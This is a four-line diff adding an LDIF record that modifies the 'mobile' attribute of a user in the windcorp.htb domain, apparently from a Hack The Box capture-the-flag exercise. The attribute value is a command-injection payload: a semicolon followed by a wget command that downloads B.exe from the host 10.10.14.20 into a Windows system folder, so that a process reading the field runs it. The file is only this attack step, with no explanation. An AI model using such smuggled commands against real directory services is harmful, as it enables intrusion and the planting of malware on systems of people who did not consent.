@@ -1,0 +1,4 @@
+dn: CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb
+changetype: modify
+replace: mobile
+mobile: ;wget http://10.10.14.20/B.exe -O C:\windows\debug\wia\B.exe
